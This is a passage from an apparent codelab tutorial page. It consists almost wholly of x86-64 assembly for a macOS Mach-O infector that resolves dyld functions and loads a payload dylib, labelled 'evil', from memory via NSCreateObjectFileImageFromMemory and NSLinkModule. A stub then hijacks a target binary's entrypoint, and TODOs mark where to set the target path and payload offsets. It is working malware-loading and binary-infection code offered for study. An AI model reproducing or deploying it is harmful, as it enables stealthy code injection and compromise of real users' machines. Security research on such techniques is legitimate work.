  call   .resolvesymbol
  mov    [rsp+0x80], rax  ; store addr of _NSCreateObjectFileImageFromMemory
  mov    rdx, [rsp+0x78]  ; Arg3: binary base address of dyld
  mov    rsi, 4           ; Arg2: offset
  mov    rdi, 0x4d6b6e69  ; Arg1: _NSLinkModule
  call   .resolvesymbol
  mov    [rsp+0x88], rax  ; store addr of _NSLinkModule

  ; change the filetype to a bundle
  mov    rdi, [rsp+0x70]  ; Arg1: mmap addr of payload
  mov    dword [rdi+0xC], 0x8

  ; create file image
  lea    rsi, [rel targetSize] ; Arg2: size
  mov    rsi, [rsi]
  lea    rdx, [rsp+0x90]  ; Arg3: NSObjectFileImage &amp;fi
  mov    rax, [rsp+0x80]
  call   rax              ; _NSCreateObjectFileImageFromMemory
  test   al, al
  jz     .leaveall

  ; link image
  mov    rdi, [rsp+0x90]  ; Arg1: NSObjectFileImage fi
  lea    rsi, [rel payloadName] ; Arg2: image name
  mov    edx, 3           ; Arg3: NSLINKMODULE_OPTION_PRIVATE | NSLINKMODULE_OPTION_BINDNOW
  mov    rax, [rsp+0x88]
  call   rax              ; _NSLinkModule
  mov    [rsp+0x98], rax  ; NSModule nm
  ; get execute_base
  mov    rdi, rax         ; Arg1: NSModule nm
  xor    rsi, rsi         ; Arg2: Payload Image Base
  mov    rdx, 0x8         ; Arg3: size of ptr increment
  mov    rcx, 1           ; Arg4: yes deref
  call   .findmacho
  cmp    rsi, 0
  je     .leaveall
  lea    rdx, [rel targetEntry]
  mov    rdx, [rdx]
  add    rsi, rdx         ; dylib image base address + export offset
  call   rsi              ; call payload function
.leaveall:
  xor    rax, rax
  mov    rax, 0x2000001   ; exit
  mov    rdi, 0
  syscall
.exit:
  add    rsp, 0xB0
  pop    rbp

  ; begin original stack prelog:
  push   rbp              ; 55        original entrypoint instructions
  mov    rbp, rsp         ; 48 89 E5  original entrypoint instructions
  push   r15              ; 41 57     original entrypoint instructions
  ; TODO: Replace these bytes to point to the original entrypoint + 6 bytes
  ; This is a relative jump so (original entrypoint+6)-(RIP+5)
  ; Change 0xEB to 0xE9 and insert 4 byte offset
  jmp .exit
  nop
  nop
  nop

; This function traverses the memory images to reach the next
; 0xfeedfacf header. It uses chmod to verify if a valid pointer.

.findmacho:
  push rbp
  mov rbp, rsp
  sub rsp, 0x20           ; allow for 3 vars
  ; rdi = arg1 addr
  ; rsi = arg2 base
  ; rdx = arg3 increment
  ; rcx = arg4 deference (1 or 0)
  mov [rsp+0], rdi        ; addr
  mov [rsp+0x8], rsi      ; base
  mov [rsp+0x10], rdx     ; increment
  mov [rsp+0x18], rcx     ; deref
  mov rbx, [rsp+0]        ; starting address
.fmloop0:
  mov rcx, [rsp+0x18]
  cmp rcx, 1              ; if dereference == 1
  jne .fmcheck
  mov rcx, [rbx]
  mov rdi, rcx            ; Arg1: check is address is valid
  jmp .fmderef
  ; chmod check
.fmcheck:                 ; else
  mov rdi, rbx            ; Arg1: check is address is valid
.fmderef:
  mov rsi, 0777o          ; Arg2: mode
  mov rax, 0x200000F      ; int chmod(user_addr_t path, int mode)
  syscall
  xor rsi, rsi            ; clear rsi
  cmp rax, 2              ; check error is ENOENT
  jne .fmloop1
  mov edx, [rdi]
  mov eax, 0xfeedfacf
  cmp eax, edx            ; if header == 0xfeedfacf
  jne .fmloop1
  mov [rsp+0x8], rdi      ; store found address
  jmp .fmexit
.fmloop1:
  add rbx, [rsp+0x10]     ; add increment
  jmp .fmloop0
.fmexit:
  mov rsi, [rsp+0x8]
  add rsp, 0x20
  pop rbp
  ret

; This function will retrieve the address to the dyld function requested.
; It will loop through the symbol names to capture the virtual offset to the
; function.
.resolvesymbol:
  push   rbp
  mov    rbp, rsp
  sub    rsp, 0xB0
  ; rdi ARG1 : target symbol
  ; rsi Arg2 : offset
  ; rdx Arg3 : base address
  ; [rsp+0] = symtab
  ; [rsp+8] = sc
  ; [rsp+0x10] = linkedit
  ; [rsp+0x18] = text
  ; [rsp+0x20] = file_slide
  ; [rsp+0x28] = target symbol
  ; [rsp+0x30] = base address
  ; [rsp+0x38] = offset
  ; [rsp+0x40] = strtab
  mov    [rsp+0x28], rdi
  mov    [rsp+0x30], rdx
  mov    [rsp+0x38], rsi
  mov    rbx, [rsp+0x30]
  mov    r8, rbx
  add    r8, 0x20         ; lc = base + sizeof(struct mach_header_64)
  mov    ecx, [rbx+0x10]  ; mach_header_64-&gt;ncmds
  sub    ecx, 1
.rsloop:
  mov    edx, [r8]        ; cmd
  cmp    edx, 0x2         ; LC_SYMTAB
  jne    .rscontinue
  mov    [rsp+0], r8      ; symtab = symtab_command
.rscontinue:
  cmp    edx, 0x19        ; LC_SEGMENT_64
  jne .rscontinue2
  mov    [rsp+0x8], r8    ; segment_command_64 sc
  mov    r11, r8          ; sc
  mov    rdx, [r8+0xA]    ; lc-&gt;segname
  cmp    edx, 0x4b4e494c  ; &#34;LINK&#34;
  jne    .case2
  mov    [rsp+0x10], r11  ; linkedit
  jmp    .rscontinue2
.case2:
  cmp    edx, 0x54584554  ; &#34;TEXT&#34;
  jne    .rscontinue2
  mov    [rsp+0x18], r11  ; text
.rscontinue2:
  mov    edx, [r8+0x4]    ; lc-&gt;cmdsize
  add    r8, rdx
  dec    rcx
  cmp    rcx, 0
  jne    .rsloop
  mov    r12, [rsp+0x10]
  cmp    r12, 0           ; if linkedit == 0 ; return -1
  jne    .getvaddr
  mov    rax, -1
  add    rsp, 0xB0
  pop    rbp
  ret
.getvaddr:
  xor r12, r12
  xor r13, r13
  xor r14, r14
  xor rdx, rdx
  xor rdi, rdi
  xor rbx, rbx
  ; unsigned long file_slide = linkedit-&gt;vmaddr - text-&gt;vmaddr - linkedit-&gt;fileoff;
  mov r12, [rsp+0x10]     ; linkedit
  mov r12d, [r12+0x18]    ; linkedit-&gt;vmaddr
  mov r13, [rsp+0x18]     ; text
  mov r13d, [r13+0x18]    ; text-&gt;vmaddr
  mov r14, [rsp+0x10]     ; linkedit
  mov r14d, [r14+0x28]    ; linkedit-&gt;fileoff
  sub r12, r13
  sub r12, r14
  mov [rsp+0x20], r12     ; file_slide
  mov rbx, [rsp+0x30]     ; base
  add rbx, r12            ; base + file_slide
  mov rdx, [rsp+0]        ; symtab
  mov edi, [rdx+0x10]     ; symtab-&gt;stroff
  add rbx, rdi            ; strtab = (char *)(base + file_slide + symtab-&gt;stroff);
  mov [rsp+0x40], rbx     ; nl
  mov rdx, [rsp+0]        ; symtab
  xor rax, rax
  mov eax, [rdx+0xC]      ; symtab-&gt;nsyms
  sub rax, 1
  xor r8, r8
  ; nl = (struct nlist_64 *)(base + file_slide + symtab-&gt;symoff);
  mov rbx, [rsp+0x30]     ; base
  mov r8d, [rdx+0x8]      ; symtab-&gt;symoff
  add r8, r12
  add r8, rbx             ; nl
  mov rcx, 0              ; int i = 0
.gvloop:
  mov rdi, [rsp+0x40]     ; strtab
  mov r11d, [r8+rcx*8]    ; nl[i].n_un.n_strx
  add rdi, r11            ; char *name = strtab + nl[i].n_un.n_strx;
  xor r13, r13
  mov r13d, [rsp+0x38]    ; offset
  mov r14d, [rsp+0x28]    ; targetSymbol
  add rdi, r13
  mov r13d, [rdi]
  cmp r13d, r14d
  jne .gvcontinue
  lea r11, [r8+rcx*8]
  mov r11, [r11+0x8]      ; nl[i].n_value
  add rbx, r11            ; base + nl[i].n_value
  mov rax, rbx
  add rsp, 0xB0
  pop rbp
  ret
.gvcontinue:
  inc rcx
  cmp rcx, rax
  jl .gvloop
  mov    rax, -1
  add    rsp, 0xB0
  pop    rbp
  ret
  section .data
    targetOffset: dq 0xFFFFFFFF ; TODO: Change to reflect the offset of the dylib bytes
    targetSize: dq 0xFFFFFFFF;  TODO: Change to reflect the size of the dylib i.e. 0x27C000
    targetEntry: dq 0xFFFFFFFF ; TODO: Change to point to the target export function of the dylib
    payloadName: db &#34;evil&#34;, 0x00
    targetName: db &#34;123&#34;, 0x00 ; TODO: change name to target Mach-o path</code></pre>


      </google-codelab-step>

  </google-codelab>

  <script src="../pkg/native-shim.js"></script>
  <script src="../pkg/custom-elements.min.js"></script>
  <script src="../pkg/prettify.js"></script>
  <script src="../pkg/codelab-elements.js"></script>

</body>
</html>
